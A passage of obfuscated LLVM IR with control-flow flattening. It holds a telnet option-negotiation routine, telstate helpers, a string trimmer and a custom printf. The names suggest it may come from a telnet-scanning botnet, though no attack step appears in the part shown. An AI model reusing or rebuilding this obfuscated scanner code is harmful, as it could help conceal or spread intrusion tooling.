  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  store i32 %12, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1567065161, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar3 = load i32, i32* %switchVar
  switch i32 %switchVar3, label %switchDefault [
    i32 1567065161, label %NodeBlock
    i32 -1761905220, label %LeafBlock1
    i32 1459289552, label %LeafBlock
    i32 -1196937833, label %16
    i32 963374428, label %17
    i32 -1897147101, label %26
    i32 582183587, label %27
    i32 2014862334, label %34
    i32 -2009593317, label %35
    i32 266278911, label %42
    i32 -890417377, label %50
    i32 1971510867, label %58
    i32 78342208, label %59
    i32 1777185644, label %60
    i32 1527214834, label %NewDefault
    i32 -391533008, label %67
    i32 1926271260, label %68
    i32 1040185944, label %69
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload5, 255
  %13 = select i1 %Pivot, i32 1459289552, i32 -1761905220
  store i32 %13, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload, 255
  %14 = select i1 %SwitchLeaf2, i32 -1196937833, i32 1527214834
  store i32 %14, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload4 = load volatile i32, i32* %.reg2mem
  %.off = add i32 %.reload4, -251
  %SwitchLeaf = icmp ule i32 %.off, 3
  %15 = select i1 %SwitchLeaf, i32 963374428, i32 1527214834
  store i32 %15, i32* %switchVar
  br label %loopEnd

; <label>:16:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 1040185944, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  store i8 -1, i8* %8, align 1
  %18 = load i32, i32* %5, align 4
  %19 = call i64 @send(i32 %18, i8* %8, i64 1, i32 16384)
  %20 = load i8*, i8** %6, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp eq i32 252, %23
  %25 = select i1 %24, i32 -1897147101, i32 582183587
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  store i8 -2, i8* %8, align 1
  store i32 1777185644, i32* %switchVar
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %28 = load i8*, i8** %6, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 254, %31
  %33 = select i1 %32, i32 2014862334, i32 -2009593317
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i8 -4, i8* %8, align 1
  store i32 78342208, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i8*, i8** %6, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 3, %39
  %41 = select i1 %40, i32 266278911, i32 -890417377
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %6, align 8
  %44 = getelementptr inbounds i8, i8* %43, i64 1
  %45 = load i8, i8* %44, align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 253
  %48 = select i1 %47, i32 251, i32 253
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %8, align 1
  store i32 1971510867, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %6, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = load i8, i8* %52, align 1
  %54 = zext i8 %53 to i32
  %55 = icmp eq i32 %54, 253
  %56 = select i1 %55, i32 252, i32 254
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %8, align 1
  store i32 1971510867, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  store i32 78342208, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 1777185644, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* %5, align 4
  %62 = call i64 @send(i32 %61, i8* %8, i64 1, i32 16384)
  %63 = load i32, i32* %5, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = getelementptr inbounds i8, i8* %64, i64 2
  %66 = call i64 @send(i32 %63, i8* %65, i64 1, i32 16384)
  store i32 1926271260, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -391533008, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  store i32 1926271260, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  store i32 0, i32* %4, align 4
  store i32 1040185944, i32* %switchVar
  br label %loopEnd

; <label>:69:                                     ; preds = %loopEntry
  %70 = load i32, i32* %4, align 4
  ret i32 %70

loopEnd:                                          ; preds = %68, %67, %NewDefault, %60, %59, %58, %50, %42, %35, %34, %27, %26, %17, %16, %LeafBlock, %LeafBlock1, %NodeBlock, %switchDefault
  br label %loopEntry
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  %3 = alloca %struct.in_addr, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 1
  %6 = load i32, i32* %5, align 4
  %7 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  store i32 %6, i32* %7, align 4
  %8 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %3, i32 0, i32 0
  %9 = load i32, i32* %8, align 4
  %10 = call i8* @inet_ntoa(i32 %9) #5
  ret i8* %10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @advance_telstate(%struct.telstate_t*, i32) #0 {
  %.reg2mem = alloca i32
  %3 = alloca %struct.telstate_t*, align 8
  %4 = alloca i32, align 4
  store %struct.telstate_t* %0, %struct.telstate_t** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i32, i32* %4, align 4
  store i32 %5, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -640687321, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -640687321, label %first
    i32 1324893876, label %8
    i32 -208914919, label %13
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %6 = icmp eq i32 %.reload, 0
  %7 = select i1 %6, i32 1324893876, i32 -208914919
  store i32 %7, i32* %switchVar
  br label %loopEnd

; <label>:8:                                      ; preds = %loopEntry
  %9 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %10 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %9, i32 0, i32 0
  %11 = load i32, i32* %10, align 8
  %12 = call i32 @close(i32 %11)
  store i32 -208914919, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %15 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %14, i32 0, i32 7
  store i32 0, i32* %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %19 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %18, i32 0, i32 2
  store i8 %17, i8* %19, align 8
  %20 = load %struct.telstate_t*, %struct.telstate_t** %3, align 8
  %21 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %20, i32 0, i32 9
  %22 = load i8*, i8** %21, align 8
  call void @llvm.memset.p0i8.i64(i8* %22, i8 0, i64 1024, i32 1, i1 false)
  ret void

loopEnd:                                          ; preds = %8, %first, %switchDefault
  br label %loopEntry
}

declare i32 @close(i32) #1

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_telstate(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #9
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -350622591, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -350622591, label %10
    i32 2086341758, label %20
    i32 997775989, label %23
    i32 -1619455986, label %24
    i32 -1618416872, label %29
    i32 325911612, label %38
    i32 2089909485, label %40
    i32 -318960015, label %43
    i32 -1430015050, label %45
    i32 -1382203425, label %50
    i32 971785428, label %62
    i32 -155247359, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #9
  %18 = icmp ne i32 %17, 0
  %19 = select i1 %18, i32 2086341758, i32 997775989
  store i32 %19, i32* %switchVar
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %4, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %4, align 4
  store i32 -350622591, i32* %switchVar
  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  store i32 -1619455986, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i32, i32* %5, align 4
  %26 = load i32, i32* %4, align 4
  %27 = icmp sge i32 %25, %26
  %28 = select i1 %27, i32 -1618416872, i32 325911612
  store i32 %28, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8*, i8** %2, align 8
  %31 = load i32, i32* %5, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds i8, i8* %30, i64 %32
  %34 = load i8, i8* %33, align 1
  %35 = sext i8 %34 to i32
  %36 = call i32 @isspace(i32 %35) #9
  %37 = icmp ne i32 %36, 0
  store i32 325911612, i32* %switchVar
  store i1 %37, i1* %.reg2mem
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %39 = select i1 %.reload, i32 2089909485, i32 -318960015
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i32, i32* %5, align 4
  %42 = add nsw i32 %41, -1
  store i32 %42, i32* %5, align 4
  store i32 -1619455986, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %3, align 4
  store i32 -1430015050, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %46 = load i32, i32* %3, align 4
  %47 = load i32, i32* %5, align 4
  %48 = icmp sle i32 %46, %47
  %49 = select i1 %48, i32 -1382203425, i32 -155247359
  store i32 %49, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %2, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = load i32, i32* %4, align 4
  %59 = sub nsw i32 %57, %58
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %56, i64 %60
  store i8 %55, i8* %61, align 1
  store i32 971785428, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %3, align 4
  %64 = add nsw i32 %63, 1
  store i32 %64, i32* %3, align 4
  store i32 -1430015050, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i8*, i8** %2, align 8
  %67 = load i32, i32* %3, align 4
  %68 = load i32, i32* %4, align 4
  %69 = sub nsw i32 %67, %68
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds i8, i8* %66, i64 %70
  store i8 0, i8* %71, align 1
  ret void

loopEnd:                                          ; preds = %62, %50, %45, %43, %40, %38, %29, %24, %23, %20, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #4

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #4

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %.reg2mem72 = alloca i32
  %.reg2mem69 = alloca i32*
  %.reg2mem65 = alloca %struct.__va_list_tag*
  %.reg2mem61 = alloca i32
  %.reg2mem58 = alloca i32*
  %.reg2mem54 = alloca %struct.__va_list_tag*
  %.reg2mem52 = alloca i8**
  %.reg2mem48 = alloca i32
  %.reg2mem45 = alloca i32*
  %.reg2mem41 = alloca %struct.__va_list_tag*
  %.reg2mem39 = alloca i8**
  %.reg2mem35 = alloca i32
  %.reg2mem32 = alloca i32*
  %.reg2mem28 = alloca %struct.__va_list_tag*
  %.reg2mem26 = alloca i8**
  %.reg2mem22 = alloca i32
  %.reg2mem19 = alloca i32*
  %.reg2mem15 = alloca %struct.__va_list_tag*
  %.reg2mem13 = alloca i8**
  %.reg2mem11 = alloca i8**
  %.reg2mem7 = alloca i32
  %.reg2mem4 = alloca i32*
  %.reg2mem = alloca %struct.__va_list_tag*
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  %switchVar = alloca i32
  store i32 948353959, i32* %switchVar
  %.reg2mem76 = alloca i1
  %.reg2mem78 = alloca i32*
  %.reg2mem80 = alloca i8*
  %.reg2mem82 = alloca i32*
  %.reg2mem84 = alloca i32*
  %.reg2mem86 = alloca i32*
  %.reg2mem88 = alloca i32*
  %.reg2mem90 = alloca i32*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 948353959, label %12
    i32 833719078, label %18
    i32 -1779039997, label %24
    i32 -2027100861, label %32
    i32 -2056625940, label %33
    i32 -1153052956, label %39
    i32 -505396841, label %40
    i32 1829255205, label %46
    i32 -1073121330, label %49
    i32 -1000830623, label %50
    i32 754607887, label %56
    i32 164672232, label %61
    i32 1782537030, label %62
    i32 -957898262, label %68
    i32 1602944029, label %73
    i32 -965381198, label %75
    i32 -1987776013, label %84
    i32 203345014, label %87
    i32 912425838, label %93
    i32 1714029903, label %99
    i32 -1426912615, label %105
    i32 686212192, label %110
    i32 1370435121, label %118
    i32 413374191, label %120
    i32 -1187376401, label %121
    i32 522179562, label %127
    i32 -737723313, label %133
    i32 998359939, label %140
    i32 553558296, label %146
    i32 -345683180, label %151
    i32 -1322176469, label %158
    i32 1480627511, label %164
    i32 1653308194, label %171
    i32 1420224410, label %177
    i32 407025709, label %182
    i32 -1974350548, label %189
    i32 -1251379524, label %195
    i32 1547444919, label %202
    i32 -1859498537, label %208
    i32 -772947893, label %213
    i32 -1896772492, label %220
    i32 -938149526, label %226
    i32 -981167582, label %233
    i32 1022587148, label %239
    i32 1027353878, label %244
    i32 -2117021526, label %251
    i32 -917163413, label %257
    i32 530778107, label %263
    i32 -1389978823, label %269
    i32 2104083858, label %274
    i32 -817296466, label %286
    i32 1957038263, label %287
    i32 -2010345333, label %288
    i32 1113630321, label %295
    i32 365473494, label %296
    i32 -776128185, label %299
    i32 -554221082, label %303
    i32 -90327994, label %306
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:12:                                     ; preds = %loopEntry
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  %17 = select i1 %16, i32 833719078, i32 -776128185
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %5, align 8
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 37
  %23 = select i1 %22, i32 -1779039997, i32 1957038263
  store i32 %23, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %5, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %27 = load i8*, i8** %5, align 8
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  %31 = select i1 %30, i32 -2027100861, i32 -2056625940
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  store i32 -776128185, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  %38 = select i1 %37, i32 -1153052956, i32 -505396841
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  store i32 -2010345333, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 45
  %45 = select i1 %44, i32 1829255205, i32 -1073121330
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %5, align 8
  %48 = getelementptr inbounds i8, i8* %47, i32 1
  store i8* %48, i8** %5, align 8
  store i32 1, i32* %8, align 4
  store i32 -1073121330, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  store i32 -1000830623, i32* %switchVar
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %5, align 8
  %52 = load i8, i8* %51, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 48
  %55 = select i1 %54, i32 754607887, i32 164672232
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i8*, i8** %5, align 8
  %58 = getelementptr inbounds i8, i8* %57, i32 1
  store i8* %58, i8** %5, align 8
  %59 = load i32, i32* %8, align 4
  %60 = or i32 %59, 2
  store i32 %60, i32* %8, align 4
  store i32 -1000830623, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 1782537030, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %5, align 8
  %64 = load i8, i8* %63, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp sge i32 %65, 48
  %67 = select i1 %66, i32 -957898262, i32 1602944029
  store i32 %67, i32* %switchVar
  store i1 false, i1* %.reg2mem76
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load i8*, i8** %5, align 8
  %70 = load i8, i8* %69, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp sle i32 %71, 57
  store i32 1602944029, i32* %switchVar
  store i1 %72, i1* %.reg2mem76
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %.reload77 = load i1, i1* %.reg2mem76
  %74 = select i1 %.reload77, i32 -965381198, i32 203345014
  store i32 %74, i32* %switchVar
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %76 = load i32, i32* %7, align 4
  %77 = mul nsw i32 %76, 10
  store i32 %77, i32* %7, align 4
  %78 = load i8*, i8** %5, align 8
  %79 = load i8, i8* %78, align 1
  %80 = zext i8 %79 to i32
  %81 = sub nsw i32 %80, 48
  %82 = load i32, i32* %7, align 4
  %83 = add nsw i32 %82, %81
  store i32 %83, i32* %7, align 4
  store i32 -1987776013, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i8*, i8** %5, align 8
  %86 = getelementptr inbounds i8, i8* %85, i32 1
  store i8* %86, i8** %5, align 8
  store i32 1782537030, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i8*, i8** %5, align 8
  %89 = load i8, i8* %88, align 1
  %90 = zext i8 %89 to i32
  %91 = icmp eq i32 %90, 115
  %92 = select i1 %91, i32 912425838, i32 522179562
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %94, %struct.__va_list_tag** %.reg2mem
  %.reload3 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %95 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload3, i32 0, i32 0
  store i32* %95, i32** %.reg2mem4
  %.reload6 = load volatile i32*, i32** %.reg2mem4
  %96 = load i32, i32* %.reload6, align 8
  store i32 %96, i32* %.reg2mem7
  %.reload10 = load volatile i32, i32* %.reg2mem7
  %97 = icmp ule i32 %.reload10, 40
  %98 = select i1 %97, i32 1714029903, i32 -1426912615
  store i32 %98, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %.reload2 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload2, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %.reload9 = load volatile i32, i32* %.reg2mem7
  %102 = getelementptr i8, i8* %101, i32 %.reload9
  %103 = bitcast i8* %102 to i32*
  %.reload8 = load volatile i32, i32* %.reg2mem7
  %104 = add i32 %.reload8, 8
  %.reload5 = load volatile i32*, i32** %.reg2mem4
  store i32 %104, i32* %.reload5, align 8
  store i32 686212192, i32* %switchVar
  store i32* %103, i32** %.reg2mem78
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %.reload = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem
  %106 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload, i32 0, i32 2
  %107 = load i8*, i8** %106, align 8
  %108 = bitcast i8* %107 to i32*
  %109 = getelementptr i8, i8* %107, i32 8
  store i8* %109, i8** %106, align 8
  store i32 686212192, i32* %switchVar
  store i32* %108, i32** %.reg2mem78
  br label %loopEnd

; <label>:110:                                    ; preds = %loopEntry
  %.reload79 = load i32*, i32** %.reg2mem78
  %111 = load i32, i32* %.reload79, align 4
  %112 = sext i32 %111 to i64
  %113 = inttoptr i64 %112 to i8*
  store i8* %113, i8** %11, align 8
  %114 = load i8**, i8*** %4, align 8
  store i8** %114, i8*** %.reg2mem11
  %115 = load i8*, i8** %11, align 8
  %116 = icmp ne i8* %115, null
  %117 = select i1 %116, i32 1370435121, i32 413374191
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  %119 = load i8*, i8** %11, align 8
  store i32 -1187376401, i32* %switchVar
  store i8* %119, i8** %.reg2mem80
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 -1187376401, i32* %switchVar
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.209, i32 0, i32 0), i8** %.reg2mem80
  br label %loopEnd

; <label>:121:                                    ; preds = %loopEntry
  %.reload81 = load i8*, i8** %.reg2mem80
  %122 = load i32, i32* %7, align 4
  %123 = load i32, i32* %8, align 4
  %.reload12 = load volatile i8**, i8*** %.reg2mem11
  %124 = call i32 @prints(i8** %.reload12, i8* %.reload81, i32 %122, i32 %123)
  %125 = load i32, i32* %9, align 4
  %126 = add nsw i32 %125, %124
  store i32 %126, i32* %9, align 4
  store i32 365473494, i32* %switchVar
  br label %loopEnd

; <label>:127:                                    ; preds = %loopEntry
  %128 = load i8*, i8** %5, align 8
  %129 = load i8, i8* %128, align 1
  %130 = zext i8 %129 to i32
  %131 = icmp eq i32 %130, 100
  %132 = select i1 %131, i32 -737723313, i32 -1322176469
  store i32 %132, i32* %switchVar
  br label %loopEnd

; <label>:133:                                    ; preds = %loopEntry
  %134 = load i8**, i8*** %4, align 8
  store i8** %134, i8*** %.reg2mem13
  %135 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  store %struct.__va_list_tag* %135, %struct.__va_list_tag** %.reg2mem15
  %.reload18 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %136 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload18, i32 0, i32 0
  store i32* %136, i32** %.reg2mem19
  %.reload21 = load volatile i32*, i32** %.reg2mem19
  %137 = load i32, i32* %.reload21, align 8
  store i32 %137, i32* %.reg2mem22
  %.reload25 = load volatile i32, i32* %.reg2mem22
  %138 = icmp ule i32 %.reload25, 40
  %139 = select i1 %138, i32 998359939, i32 553558296
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %.reload17 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %141 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload17, i32 0, i32 3
  %142 = load i8*, i8** %141, align 8
  %.reload24 = load volatile i32, i32* %.reg2mem22
  %143 = getelementptr i8, i8* %142, i32 %.reload24
  %144 = bitcast i8* %143 to i32*
  %.reload23 = load volatile i32, i32* %.reg2mem22
  %145 = add i32 %.reload23, 8
  %.reload20 = load volatile i32*, i32** %.reg2mem19
  store i32 %145, i32* %.reload20, align 8
  store i32 -345683180, i32* %switchVar
  store i32* %144, i32** %.reg2mem82
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %.reload16 = load volatile %struct.__va_list_tag*, %struct.__va_list_tag** %.reg2mem15
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %.reload16, i32 0, i32 2
  %148 = load i8*, i8** %147, align 8
  %149 = bitcast i8* %148 to i32*
  %150 = getelementptr i8, i8* %148, i32 8
  store i8* %150, i8** %147, align 8
  store i32 -345683180, i32* %switchVar
  store i32* %149, i32** %.reg2mem82
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %.reload83 = load i32*, i32** %.reg2mem82
  %152 = load i32, i32* %.reload83, align 4
  %153 = load i32, i32* %7, align 4
  %154 = load i32, i32* %8, align 4
  %.reload14 = load volatile i8**, i8*** %.reg2mem13
  %155 = call i32 @printi(i8** %.reload14, i32 %152, i32 10, i32 1, i32 %153, i32 %154, i32 97)
  %156 = load i32, i32* %9, align 4
  %157 = add nsw i32 %156, %155
  store i32 %157, i32* %9, align 4
  store i32 365473494, i32* %switchVar
  br label %loopEnd

; <label>:158:                                    ; preds = %loopEntry
